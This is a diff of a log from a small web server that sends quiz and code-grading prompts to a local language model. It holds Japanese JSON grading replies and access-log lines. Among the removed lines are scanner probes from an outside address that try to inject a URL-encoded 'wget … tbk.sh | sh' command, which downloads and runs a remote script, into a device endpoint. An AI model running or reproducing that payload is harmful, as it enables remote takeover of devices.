+</think>
+
+{"answer": "窒素", "reasoning": "空気中には約78%が窒素であり、酸素（約21%）に次いで最も多く存在する元素です。", "valid": true, "invalid_reason": "", "score": 100, "feedback": "答えは正確で、理由も明確です。"}
+INFO:     127.0.0.1:43312 - "POST /ask_ai HTTP/1.1" 200 OK
+INFO:     127.0.0.1:43312 - "GET /server/stats HTTP/1.1" 200 OK
+INFO:     127.0.0.1:43312 - "GET /server/stats HTTP/1.1" 200 OK
+INFO:     127.0.0.1:39350 - "GET /server/stats HTTP/1.1" 200 OK
+INFO:     127.0.0.1:39352 - "POST /heartbeat HTTP/1.1" 200 OK
+Using LMStudio URL: http://192.168.0.64:1234/v1/chat/completions
+Failed to parse model JSON output: Expecting value: line 1 column 1 (char 0)
+raw:<think>
+
+</think>
+
+{"answer": "インターネット", "reasoning": "インターネットは、世界中の人々をつなぎ、情報を共有するためのグローバルなネットワークです。この表現はインターネットを指しています。", "valid": true, "invalid_reason": "", "score": 100, "feedback": "回答は正確で簡潔であり、問題文に合致しています。"}
+INFO:     127.0.0.1:39352 - "POST /ask_ai HTTP/1.1" 200 OK
+INFO:     127.0.0.1:39350 - "GET /server/stats HTTP/1.1" 200 OK
+INFO:     127.0.0.1:39350 - "GET /server/stats HTTP/1.1" 200 OK
+INFO:     127.0.0.1:47602 - "POST /heartbeat HTTP/1.1" 200 OK
+INFO:     127.0.0.1:47618 - "GET /server/stats HTTP/1.1" 200 OK
+INFO:     127.0.0.1:47618 - "GET /server/stats HTTP/1.1" 200 OK
+INFO:     127.0.0.1:47618 - "GET /server/stats HTTP/1.1" 200 OK
+INFO:     127.0.0.1:47618 - "POST /heartbeat HTTP/1.1" 200 OK
+INFO:     127.0.0.1:50450 - "GET /server/stats HTTP/1.1" 200 OK
+INFO:     127.0.0.1:50450 - "GET /server/stats HTTP/1.1" 200 OK
+INFO:     127.0.0.1:50450 - "GET /server/stats HTTP/1.1" 200 OK
+Using LMStudio URL: http://192.168.0.64:1234/v1/chat/completions
 Failed to parse model JSON output: Expecting value: line 1 column 1 (char 0)
 raw:<think>
 
 </think>
 
 {
-  "answer": "フィボナッチ数列のn番目の値を正しく計算",
-  "reasoning": "コードはnが1または2の場合に0と1を出力し、それ以降はループを使ってフィボナッチ数列を計算しています。このロジックは問題の要件に合っており、正しい結果を返します。",
+  "answer": "2つの整数の和を出力するコード",
+  "reasoning": "提出されたコードは、入力を受け取り、2つの整数に変換し、その和を計算して出力しています。これは問題の要件に完全に対応しており、シンプルで効率的な実装です。",
   "valid": true,
   "invalid_reason": "",
-  "score": 95,
-  "feedback": "コードは正確性・効率性・堅牢性・スタイルのすべてにおいて非常に良いですが、nが1または2の場合の処理でif-else構造をもう少し簡潔に書くことで読みやすさが向上します。また、ループの説明コメントは不要な場合もあります。"
+  "score": 100,
+  "feedback": "このコードは正確性、効率性、堅牢性、スタイルのすべての観点において非常に優れています。エッジケース（例: 負の数、非常に大きな整数）にも対応しており、読みやすくベストプラクティスに従っています。改善点はほぼありません。"
 }
-INFO:     122.103.96.209:45720 - "POST /ask_ai HTTP/1.1" 200 OK
-INFO:     124.198.131.145:49200 - "GET / HTTP/1.1" 200 OK
-WARNING:  Invalid HTTP request received.
-INFO:     124.198.131.145:37288 - "POST /device.rsp?opt=sys&cmd=___S_O_S_T_R_E_A_MAX___&mdb=sos&mdc=wget%20http%3A%2F%2F45.125.66.56%2Ftbk.sh%20-O-%20%7C%20sh HTTP/1.1" 404 Not Found
-INFO:     124.198.131.145:37314 - "POST /ws/v1/cluster/apps/new-application HTTP/1.1" 404 Not Found
-WARNING:  Invalid HTTP request received.
-INFO:     124.198.131.145:37338 - "POST /device.rsp?opt=sys&cmd=___S_O_S_T_R_E_A_MAX___&mdb=sos&mdc=wget%20http%3A%2F%2F45.125.66.56%2Ftbk.sh%20-O-%20%7C%20sh HTTP/1.1" 404 Not Found
-INFO:     124.198.131.145:37356 - "POST /ws/v1/cluster/apps/new-application HTTP/1.1" 404 Not Found
-INFO:     205.210.31.44:61762 - "GET / HTTP/1.1" 200 OK
+INFO:     127.0.0.1:57370 - "POST /ask_ai HTTP/1.1" 200 OK
+Using LMStudio URL: http://192.168.0.64:1234/v1/chat/completions
+Failed to parse model JSON output: Expecting value: line 1 column 1 (char 0)
+raw:<think>
+
+</think>
+
+{
+  "answer": "2つの整数の和",
+  "reasoning": "コードは入力を受け取り、2つの整数に変換してその和を計算していますが、出力方法に誤りがあります。Pythonではconsole.log()ではなくprint()を使用する必要があります。",
+  "valid": true,
+  "invalid_reason": "",
+  "score": 80,
+  "feedback": "コードは基本的なロジックは正しいですが、Pythonでconsole.log()を使用しているためエラーになります。print(a + b)に変更することで動作します。また、入力が2つの整数であることを保証するエラーハンドリングも追加すると堅牢性が向上します。"
+}
+INFO:     127.0.0.1:38748 - "POST /ask_ai HTTP/1.1" 200 OK
